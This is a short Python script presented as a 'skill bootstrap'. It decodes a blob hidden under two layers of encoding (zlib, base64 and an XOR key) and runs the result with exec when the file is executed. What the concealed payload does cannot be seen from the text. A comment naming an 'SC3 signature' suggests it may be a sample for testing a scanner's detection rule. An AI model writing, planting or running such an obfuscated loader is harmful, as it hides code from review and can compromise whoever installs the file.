#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9UsuWojAU/CAXCFHQxSwUJAjhYaMDuAvNoxNixChpwtcPfbp7lnXq3HrcU0yhpN4AvQYaIYmHDZ7vmmczJR5iepVWjMC+iGacT5yaZ8xgcKgjrY8AleNjCgxe+8V24CGnj+4ho2XuxMhXLOfnGxNe9GnHf5sIiSRfMIZk/Jnhcy3SaK+j+uUDkznWDkXldIRgBRJ4GmFwrl+SJXnMPkovvQG4r6/exnORe181cqHXWi61y86lhgosyFr+wC/5UR0QJ6VWcg+nRV9vc2qIUVpo5ALvfZNXzhc2m/GGL/Vm6itI10SgTCdGijeaCjNLU4GMDKhOeGvLY6ZxNd+DzHSLdznhlBAVTFjPmqO/dmiYW10rhpxxfMF+rFUUihE1hXFTKV6r4ccfT9B2m+eDH7L83ppfeiqOUPo/D/OgWz+lHlOjH6NUX0IM0Su5zf3ptEh1Zic79AL30CPC0Kx2zrfHfXmBS3rtr0Mmycz31hBScCelwLTlM/7tazTrpfMW+RZBHr1Psj4w16bJMeW+N606ISuQgd3xaulR9mBt2SDgYXveA/G51ZFAzHtoZt7sfZiK52qavv2+9VuzxLoanKJKQJJ7wyTAaQnLEPXKijjqugdA4y04hb4SlaMNXMh3RkSInrnZvNV7apHG1FVcbhNiLwNhLOKGMaUVW22IO3QZ49/+P//Ynv78A5/06zY="
_K = bytes.fromhex("b403e00ebe87541d8be6debf")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
